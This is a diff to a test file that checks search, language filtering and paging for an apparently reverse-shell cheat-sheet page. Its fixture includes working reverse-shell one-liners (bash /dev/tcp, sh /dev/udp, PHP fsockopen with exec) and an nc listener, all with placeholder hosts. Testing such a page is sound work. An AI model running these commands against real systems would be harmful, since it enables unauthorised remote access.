@@ -8,13 +8,13 @@ const mod: { exports: Record<string, (...a: any[]) => any> } = { exports: {} }; 
 const run = () => new Function('module', src)(mod);
 
 const item = (name: string, cmd: string, off = false) =>
-  `<div class="rs-item"${off ? ' data-off=""' : ''}><h3>${name}</h3><p class="note">Reverse shell for Linux.</p>${off ? '<p class="note shell-unavailable">Unavailable.</p>' : `<pre><code>${cmd}</code></pre>`}</div>`;
+  `<div class="rs-item"${off ? ' data-off=""' : ''}><h3>${name}</h3><p class="note">Reverse shell for Linux and Windows.</p>${off ? '<p class="note shell-unavailable">Unavailable.</p>' : `<pre><code>${cmd}</code></pre>`}</div>`;
 const FIXTURE = `<main id="main"><h1>Shells</h1>
-<div class="chips"><a href="#bash">Bash (2)</a><a href="#php">PHP (1)</a><a href="#perl">Perl (1)</a></div>
+<div class="tf rs-fill" id="rs-fill" hidden><div class="tf-controls"><div class="tf-field"><input id="rs-lhost" type="text" /></div><div class="tf-field"><input id="rs-lport" type="text" /></div></div></div>
 <!--email_off-->
-<section class="rs-lang" data-lang="bash"><h2 id="bash">Bash reverse shells</h2>${item('Bash -i', 'bash -i &gt;&amp; /dev/tcp/{LHOST}/{LPORT} 0&gt;&amp;1')}${item('Bash UDP', 'sh -i &gt;&amp; /dev/udp/{LHOST}/{LPORT}')}</section>
-<section class="rs-lang" data-lang="php"><h2 id="php">PHP reverse shells</h2>${item('PHP exec', 'php -r &#39;$sock=fsockopen("{LHOST}",{LPORT});exec("sh");&#39;')}</section>
-<section class="rs-lang" data-lang="perl"><h2 id="perl">Perl reverse shells</h2>${item('Perl none', '', true)}</section>
+<section class="rs-lang" data-lang="bash" data-label="Bash" data-listener="nc -lvnp {LPORT}"><h2 id="bash">Bash reverse shells</h2><p class="note">Listener:</p><pre><code>nc -lvnp {LPORT}</code></pre>${item('Bash -i', 'bash -i &gt;&amp; /dev/tcp/{LHOST}/{LPORT} 0&gt;&amp;1')}${item('Bash UDP', 'sh -i &gt;&amp; /dev/udp/{LHOST}/{LPORT}')}</section>
+<section class="rs-lang" data-lang="php" data-label="PHP"><h2 id="php">PHP reverse shells</h2>${item('PHP exec', 'php -r &#39;$sock=fsockopen("{LHOST}",{LPORT});exec("sh");&#39;')}</section>
+<section class="rs-lang" data-lang="perl" data-label="Perl"><h2 id="perl">Perl reverse shells</h2>${item('Perl none', '', true)}</section>
 <!--/email_off--></main>`;
 
 const $ = <T extends Element>(s: string) => document.querySelector(s) as T;
@@ -52,20 +52,39 @@ describe('revshells filter in the DOM', () => {
     run();
   });
 
-  it('adds one labelled toolbar before the jump chips and counts shells that have a command', () => {
+  it('puts search, language and the count inside the LHOST bar, shows it, and counts shells that have a command', () => {
     expect(document.querySelectorAll('.rs-filter')).toHaveLength(1);
-    expect($('.rs-filter').nextElementSibling?.className).toBe('chips');
-    expect($('.tf-count').textContent).toBe('Showing 3 of 3 shells');
+    expect($<HTMLElement>('#rs-fill').hidden).toBe(false);
+    expect($('#rs-fill').classList.contains('rs-filter')).toBe(true);
+    expect($('#rs-fill #rsf-q')).toBeTruthy();
+    expect($('#rs-fill #rsf-lang')).toBeTruthy();
+    expect($('#rs-fill .tf-count').textContent).toBe('Showing 3 of 3 shells');
+    expect(document.querySelector('.chips')).toBeNull();
     expect(visible()).toHaveLength(4);
   });
 
-  it('filters by language and hides the emptied sections and their chips', () => {
+  it('labels the language select from data-label', () => {
+    expect([...document.querySelectorAll('#rsf-lang option')].map((o) => o.textContent)).toEqual(['All languages', 'Bash', 'PHP', 'Perl']);
+  });
+
+  it('hides the list heading from view and keeps it focusable', () => {
+    const head = $('#rs-list-head');
+    expect(head.classList.contains('sr-only')).toBe(true);
+    expect(head.getAttribute('tabindex')).toBe('-1');
+  });
+
+  it('filters by language and hides the emptied sections', () => {
     choose($('#rsf-lang'), 'bash');
     expect(visible()).toEqual(['Bash -i', 'Bash UDP']);
     expect($('.tf-count').textContent).toBe('Showing 2 of 3 shells');
     expect($<HTMLElement>('section[data-lang="php"]').hidden).toBe(true);
-    expect($<HTMLAnchorElement>('.chips a[href="#php"]').hidden).toBe(true);
-    expect($<HTMLAnchorElement>('.chips a[href="#bash"]').hidden).toBe(false);
+    expect($<HTMLElement>('section[data-lang="bash"]').hidden).toBe(false);
+  });
+
+  it('finds shells by a listener printed once for their section', async () => {
+    type($('#rsf-q'), 'nc -lvnp');
+    await wait(160);
+    expect(visible()).toEqual(['Bash -i', 'Bash UDP']);
   });
 
   it('searches names, notes and the command text', async () => {
@@ -114,10 +133,9 @@ describe('revshells paging helpers', () => {
 
 // 25 + 22 + 1 = 48 shells with a command (3 pages of 20), plus one "Unavailable" entry placed after the 20th shell of language "a".
 const many = (lang: string, label: string, n: number, extra = '') =>
-  `<section class="rs-lang" data-lang="${lang}"><h2 id="${lang}">${label} reverse shells</h2>${Array.from({ length: n }, (_, i) => item(`${lang}-${i}`, `run ${lang}${i} {LHOST} {LPORT}`) + (extra && i === 19 ? extra : '')).join('')}</section>`;
+  `<section class="rs-lang" data-lang="${lang}" data-label="${label}"><h2 id="${lang}">${label} reverse shells</h2>${Array.from({ length: n }, (_, i) => item(`${lang}-${i}`, `run ${lang}${i} {LHOST} {LPORT}`) + (extra && i === 19 ? extra : '')).join('')}</section>`;
 const PAGED = `<main id="main"><h1>Shells</h1>
 <div class="tf rs-fill" id="rs-fill" hidden><input id="rs-lhost" type="text" /><input id="rs-lport" type="text" /></div>
-<div class="chips"><a href="#a">A (25)</a><a href="#b">B (22)</a><a href="#c">C (1)</a></div>
 <!--email_off-->${many('a', 'A', 25, item('a-off', '', true))}${many('b', 'B', 22)}${many('c', 'C', 1)}<!--/email_off--></main>`;
 const ccSrc = readFileSync('public/copy-code.js', 'utf8');
 const names = () => visible();
@@ -136,7 +154,7 @@ describe('revshells paging in the DOM', () => {
 
   it('shows 20 shells per page with a pager above and below, Previous disabled on page 1', () => {
     expect(visible().filter((n) => n !== 'a-off')).toHaveLength(20);
-    expect($('.tf-count').textContent).toBe('Showing 1-20 of 48 shells. Page 1 of 3');
+    expect($('.tf-count').textContent).toBe('Showing 1-20 of 48 shells');
     expect(document.querySelectorAll('.rs-pager')).toHaveLength(2);
     expect(pagerLabels()).toEqual(['Page 1 of 3', 'Page 1 of 3']);
     const [prev, next] = document.querySelectorAll<HTMLButtonElement>('.rs-pager button');
@@ -159,13 +177,13 @@ describe('revshells paging in the DOM', () => {
     expect(names()).not.toContain('a-off');
     expect(h2('a')).toBe('A reverse shells (continued)');
     expect(h2('b')).toBe('B reverse shells');
-    expect($('.tf-count').textContent).toBe('Showing 21-40 of 48 shells. Page 2 of 3');
+    expect($('.tf-count').textContent).toBe('Showing 21-40 of 48 shells');
     clickNext();
     expect(h2('b')).toBe('B reverse shells (continued)');
     expect(names()).toContain('c-0');
     const next = document.querySelectorAll<HTMLButtonElement>('.rs-pager button')[1];
     expect(next.disabled).toBe(true);
-    expect($('.tf-count').textContent).toBe('Showing 41-48 of 48 shells. Page 3 of 3');
+    expect($('.tf-count').textContent).toBe('Showing 41-48 of 48 shells');
     clickPrev();
     clickPrev();
     expect(h2('a')).toBe('A reverse shells');
@@ -223,17 +241,6 @@ describe('revshells paging in the DOM', () => {
     run();
     expect([...document.querySelectorAll<HTMLElement>('.rs-pager')].every((p) => p.hidden)).toBe(true);
     expect(visible()).toHaveLength(4);
-  });
-
-  it('a language chip opens the page that holds its first shell', async () => {
-    $<HTMLAnchorElement>('.chips a[href="#c"]').click();
-    expect(pagerLabels()[0]).toBe('Page 3 of 3');
-    expect(names()).toContain('c-0');
-    $<HTMLAnchorElement>('.chips a[href="#b"]').click();
-    expect(pagerLabels()[0]).toBe('Page 2 of 3');
-    expect(names()).toContain('b-0');
-    expect($<HTMLAnchorElement>('.chips a[href="#c"]').hidden).toBe(false);
-    await wait(30); // let jsdom finish the queued fragment navigations before the next test
   });
 
   it('reacts to hashchange after load', async () => {
